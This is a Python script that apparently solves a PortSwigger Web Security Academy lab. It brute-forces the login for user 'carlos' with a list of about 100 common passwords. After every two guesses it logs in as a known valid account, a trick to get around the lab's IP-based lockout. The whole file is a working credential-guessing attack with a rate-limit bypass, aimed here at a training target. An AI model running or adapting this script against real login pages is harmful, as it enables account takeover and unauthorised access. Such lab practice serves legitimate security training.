from requests import post


# Coloque a url do lab aqui
baseurl = 'https://0a730007040d765b83be912900270080.web-security-academy.net'
url = f'{baseurl}/login'

header = {
    'Cookie': 'session=drsLWPG9ljoF38MPCyf4SdwhpaWRziMj',
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv':137.0) Gecko/20100101 Firefox/137.0",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': baseurl,
    'Referer': url,
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i',
    'Te': 'trailers',
}

password_list = [
    '123456',
    'password',
    '12345678',
    'qwerty',
    '123456789',
    '12345',
    '1234',
    '111111',
    '1234567',
    'dragon',
    '123123',
    'baseball',
    'abc123',
    'football',
    'monkey',
    'letmein',
    'shadow',
    'master',
    '666666',
    'qwertyuiop',
    '123321',
    'mustang',
    '1234567890',
    'michael',
    '654321',
    'superman',
    '1qaz2wsx',
    '7777777',
    '121212',
    '000000',
    'qazwsx',
    '123qwe',
    'killer',
    'trustno1',
    'jordan',
    'jennifer',
    'zxcvbnm',
    'asdfgh',
    'hunter',
    'buster',
    'soccer',
    'harley',
    'batman',
    'andrew',
    'tigger',
    'sunshine',
    'iloveyou',
    '2000',
    'charlie',
    'robert',
    'thomas',
    'hockey',
    'ranger',
    'daniel',
    'starwars',
    'klaster',
    '112233',
    'george',
    'computer',
    'michelle',
    'jessica',
    'pepper',
    '1111',
    'zxcvbn',
    '555555',
    '11111111',
    '131313',
    'freedom',
    '777777',
    'pass',
    'maggie',
    '159753',
    'aaaaaa',
    'ginger',
    'princess',
    'joshua',
    'cheese',
    'amanda',
    'summer',
    'love',
    'ashley',
    'nicole',
    'chelsea',
    'biteme',
    'matthew',
    'access',
    'yankees',
    '987654321',
    'dallas',
    'austin',
    'thunder',
    'taylor',
    'matrix',
    'mobilemail',
    'mom',
    'monitor',
    'monitoring',
    'montana',
    'moon',
    'moscow',
]

login_list = []

for i in range(0, len(password_list), 2):
    chunk = password_list[i:i+2]

    for senha in chunk:
        login_list.append({'username': 'carlos', 'password': senha})
    
    login_list.append({'username': 'wiener', 'password': 'peter'})

for data in login_list:
    request = post(url, headers=header, data=data, allow_redirects=False)
    if request.status_code != 200 and data['password'] != 'peter':
        print(f"\033[92mPassword found: {data['password']} code: {request.status_code}\033[0m")
        break
    print(f"Trying {data['password']} code: {request.status_code}")
    